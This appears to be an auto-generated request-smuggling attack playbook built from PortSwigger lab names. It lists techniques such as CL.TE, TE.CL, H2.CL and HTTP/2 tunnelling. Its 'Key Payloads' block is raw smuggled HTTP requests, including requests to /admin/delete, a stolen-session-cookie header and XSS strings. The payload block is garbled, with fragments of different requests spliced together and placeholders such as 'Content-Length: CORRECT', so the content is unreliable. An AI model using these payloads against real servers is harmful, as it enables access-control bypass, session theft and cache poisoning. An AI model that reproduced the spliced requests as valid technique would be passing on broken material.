## REQUEST SMUGGLING Playbook
*Synthesized from 22 PortSwigger labs*

### Overview
This playbook covers 22 known attack techniques for request_smuggling.

### Attack Techniques

**Bypass Techniques:**
- Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
- Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

**General:**
- 0.CL request smuggling
- H2.CL request smuggling
- HTTP/2 request smuggling via CRLF injection
- HTTP/2 request splitting via CRLF injection
- Bypassing access controls via HTTP/2 request tunnelling
- Web cache poisoning via HTTP/2 request tunnelling
- Response queue poisoning via H2.TE request smuggling
- CL.0 request smuggling

**Reflected:**
- Exploiting HTTP request smuggling to deliver reflected XSS

### Key Payloads
```
</script>
POST / HTTP/1.1
Host: [LAB_ID].h1-[TARGET]
Connection: close
Content-Length: CORRECT

GET /hopefully404 HTTP/1.1
Foo: x
Transfer-Encoding: chunked
foo: bar\r\nHost: abc
GET /admin HTTP/2
Host: [LAB_ID].[TARGET]
Cookie: session=STOLEN-SESSION-COOKIE
"/><script>alert(1)</script>
POST / HTTP/1.1
Host: [LAB_ID].[TARGET]
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
HTTP/1.1
alert(1)
/resources
0

SMUGGLED
GET /admin/delete?username=[TARGET_USER]
POST /
X-*-IP
bar\r\n\r\nGET /x HTTP/1.1\r\nHost: [LAB_ID].[TARGET]
\r\n
POST / HTTP/2
Host: [LAB_ID].[TARGET]
Content-Length: 0

GET /resources HTTP/1.1
Host: foo
Content-Length: 5

x=1
Content-Length: 0
foo: bar\r\nContent-Length: 500\r\n\r\nsearch=x
/resources/js/tracking.js
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

